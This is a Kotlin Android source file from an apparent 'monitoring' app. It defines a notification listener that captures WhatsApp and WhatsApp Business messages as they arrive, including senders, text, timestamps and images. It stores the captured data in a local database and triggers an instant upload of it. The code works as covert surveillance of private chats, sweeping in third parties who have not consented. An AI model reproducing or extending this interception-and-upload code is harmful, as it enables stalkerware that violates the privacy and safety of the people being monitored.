package com.spapp.monitoring.collectors

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Listens to incoming and active system notifications for messaging apps (e.g. WhatsApp & WhatsApp Business).
 * Captures chat messages with sender name, text, and timestamp in real-time
 * even when WhatsApp is running in the background.
 */
class WhatsAppNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this
        processAllActiveNotifications()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    fun processAllActiveNotifications() {
        try {
            val activeNotifs = activeNotifications
            if (activeNotifs != null) {
                for (sbn in activeNotifs) {
                    processNotification(sbn)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read active notifications", e)
        }
    }


    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return
        processNotification(sbn)
    }

    private fun processNotification(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
        val text = if (!bigText.isNullOrBlank()) bigText else normalText
        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        // Extract exact real message timestamp from WhatsApp notification
        val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

        // Extract real image thumbnail if present in notification extras
        var mediaType: String? = null
        var mediaPath: String? = null

        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)

        if (pictureBitmap != null) {
            try {
                val stream = java.io.ByteArrayOutputStream()
                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, stream)
                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                mediaType = "image"
                mediaPath = "data:image/jpeg;base64,$base64"
            } catch (_: Exception) {}
        } else if (text?.contains("📷") == true || text?.contains("Photo", ignoreCase = true) == true) {
            mediaType = "image"
            try {
                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
            } catch (_: Exception) {}
        }

        // Determine chat name: conversation title (groups) > title > fallback
        val chatName = when {
            !convoTitle.isNullOrBlank() -> convoTitle
            !title.isNullOrBlank() && title != "WhatsApp" && title != "WhatsApp Business" -> title
            else -> title ?: "WhatsApp"
        }

        // Skip non-message service notifications
        val checkStr = "${title.orEmpty()} ${text.orEmpty()}".lowercase()
        if (checkStr.contains("checking for new messages") ||
            checkStr.contains("whatsapp web is active") ||
            checkStr.contains("backup in progress") ||
            checkStr.contains("deleting messages")
        ) {
            return
        }

        val entries = mutableListOf<WhatsAppMessageEntry>()

        // 1. Android MessagingStyle bundled messages (android.messages & android.historicMessages)
        val messageBundles = extras.getParcelableArray("android.messages")
        val historicBundles = extras.getParcelableArray("android.historicMessages")
        val allBundles = mutableListOf<android.os.Bundle>()
        if (historicBundles != null) {
            for (item in historicBundles) {
                if (item is android.os.Bundle) allBundles.add(item)
            }
        }
        if (messageBundles != null) {
            for (item in messageBundles) {
                if (item is android.os.Bundle) allBundles.add(item)
            }
        }

        if (allBundles.isNotEmpty()) {
            for (b in allBundles) {
                val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
                if (bText.isBlank()) continue
                val bTime = b.getLong("time", postTime)
                val senderName = b.getCharSequence("sender")?.toString()?.trim()
                    ?: title ?: chatName
                val isOutgoing = senderName.equals("me", ignoreCase = true) ||
                                 senderName.equals("you", ignoreCase = true)

                entries += WhatsAppMessageEntry(
                    chatName = chatName,
                    sender = if (isOutgoing) "me" else senderName,
                    messageText = bText,
                    isOutgoing = isOutgoing,
                    messageTimeEpochMs = if (bTime > 0) bTime else postTime,
                    mediaType = mediaType,
                    mediaPath = mediaPath
                )
            }
        } else if (!textLines.isNullOrEmpty()) {
            // 2. InboxStyle / multi-message bundled notification lines fallback
            for (line in textLines) {
                val lineStr = line?.toString()?.trim() ?: continue
                if (lineStr.isBlank()) continue
                val colonIdx = lineStr.indexOf(':')
                val (sender, msg) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
                    val s = lineStr.substring(0, colonIdx).trim()
                    val m = lineStr.substring(colonIdx + 1).trim()
                    Pair(s, m)
                } else {
                    Pair(title ?: chatName, lineStr)
                }
                entries += WhatsAppMessageEntry(
                    chatName = chatName,
                    sender = sender,
                    messageText = msg,
                    isOutgoing = false,
                    messageTimeEpochMs = postTime,
                    mediaType = mediaType,
                    mediaPath = mediaPath
                )
            }
        } else if (!text.isNullOrBlank() && !text.matches(Regex("^\\d+\\s+new messages?.*", RegexOption.IGNORE_CASE))) {
            entries += WhatsAppMessageEntry(
                chatName = chatName,
                sender = title ?: chatName,
                messageText = text,
                isOutgoing = false,
                messageTimeEpochMs = postTime,
                mediaType = mediaType,
                mediaPath = mediaPath
            )
        }

        if (entries.isNotEmpty()) {
            scope.launch {
                try {
                    val db = AppDatabase.getInstance(applicationContext)
                    db.whatsAppMessageDao().insertAll(entries)
                    RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to record WhatsApp notification message", e)
                }
            }
        }
    }

    /**
     * Extracts all messages for a specific chat from current active notifications
     * filtered to those within the given cutoff time (e.g. last 2 days).
     */
    fun extractMessagesForChat(chatName: String, cutoffTimeMs: Long): List<WhatsAppMessageEntry> {
        val results = mutableListOf<WhatsAppMessageEntry>()
        val activeNotifs = try { activeNotifications } catch (_: Exception) { null } ?: return emptyList()

        for (sbn in activeNotifs) {
            val pkg = sbn.packageName ?: continue
            if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") continue
            val notification = sbn.notification ?: continue
            val extras = notification.extras ?: continue

            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
            val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim()
            val cleanChatName = chatName.trim()

            val notGeneric = title != null && !title.equals("WhatsApp", ignoreCase = true) && !title.equals("WhatsApp Business", ignoreCase = true)
            val words = cleanChatName.split(Regex("[\\s_\\-]+")).filter { it.length >= 3 }
            val wordMatch = words.any { w ->
                (convoTitle != null && convoTitle.contains(w, ignoreCase = true)) ||
                (notGeneric && title!!.contains(w, ignoreCase = true)) ||
                (subText != null && subText.contains(w, ignoreCase = true))
            }
            val matchesChat = (convoTitle != null && convoTitle.contains(cleanChatName, ignoreCase = true)) ||
                              (notGeneric && title!!.contains(cleanChatName, ignoreCase = true)) ||
                              (subText != null && subText.contains(cleanChatName, ignoreCase = true)) ||
                              (notGeneric && cleanChatName.contains(title!!, ignoreCase = true)) ||
                              (convoTitle != null && cleanChatName.contains(convoTitle, ignoreCase = true)) ||
                              wordMatch

            if (!matchesChat) continue

            val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

            val messageBundles = extras.getParcelableArray("android.messages")
            val historicBundles = extras.getParcelableArray("android.historicMessages")
            val allBundles = mutableListOf<android.os.Bundle>()
            if (historicBundles != null) {
                for (item in historicBundles) {
                    if (item is android.os.Bundle) allBundles.add(item)
                }
            }
            if (messageBundles != null) {
                for (item in messageBundles) {
                    if (item is android.os.Bundle) allBundles.add(item)
                }
            }

            if (allBundles.isNotEmpty()) {
                for (b in allBundles) {
                    val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
                    if (bText.isBlank()) continue
                    val bTime = b.getLong("time", postTime)
                    if (bTime < cutoffTimeMs) continue

                    val senderName = b.getCharSequence("sender")?.toString()?.trim()
                        ?: title ?: cleanChatName
                    val isOutgoing = senderName.equals("me", ignoreCase = true) ||
                                     senderName.equals("you", ignoreCase = true)

                    results += WhatsAppMessageEntry(
                        chatName = cleanChatName,
                        sender = if (isOutgoing) "me" else senderName,
                        messageText = bText,
                        isOutgoing = isOutgoing,
                        messageTimeEpochMs = bTime
                    )
                }
            } else {
                val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                if (!textLines.isNullOrEmpty()) {
                    for (line in textLines) {
                        val lineStr = line?.toString()?.trim() ?: continue
                        if (lineStr.isBlank()) continue
                        if (postTime < cutoffTimeMs) continue
                        val colonIdx = lineStr.indexOf(':')
                        val (s, m) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
                            Pair(lineStr.substring(0, colonIdx).trim(), lineStr.substring(colonIdx + 1).trim())
                        } else {
                            Pair(title ?: cleanChatName, lineStr)
                        }
                        results += WhatsAppMessageEntry(
                            chatName = cleanChatName,
                            sender = s,
                            messageText = m,
                            isOutgoing = false,
                            messageTimeEpochMs = postTime
                        )
                    }
                } else {
                    val singleText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
                        ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
                    if (!singleText.isNullOrBlank() && postTime >= cutoffTimeMs) {
                        results += WhatsAppMessageEntry(
                            chatName = cleanChatName,
                            sender = title ?: cleanChatName,
                            messageText = singleText,
                            isOutgoing = false,
                            messageTimeEpochMs = postTime
                        )
                    }
                }
            }
        }

        return results
    }

    companion object {
        private const val TAG = "WhatsAppNotification"
        @Volatile
        var instance: WhatsAppNotificationListener? = null
            private set

        fun getActiveChatNames(): List<String> {
            val inst = instance ?: return emptyList()
            val names = mutableListOf<String>()
            try {
                val activeNotifs = inst.activeNotifications ?: return emptyList()
                for (sbn in activeNotifs) {
                    val pkg = sbn.packageName ?: continue
                    if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") continue
                    val extras = sbn.notification?.extras ?: continue
                    val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
                    val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
                    val candidate = when {
                        !convoTitle.isNullOrBlank() -> convoTitle
                        !title.isNullOrBlank() && !title.equals("WhatsApp", ignoreCase = true) && !title.equals("WhatsApp Business", ignoreCase = true) -> title
                        else -> null
                    }
                    if (!candidate.isNullOrBlank() && !names.contains(candidate)) {
                        names.add(candidate)
                    }
                }
            } catch (_: Exception) {}
            return names
        }
    }
}
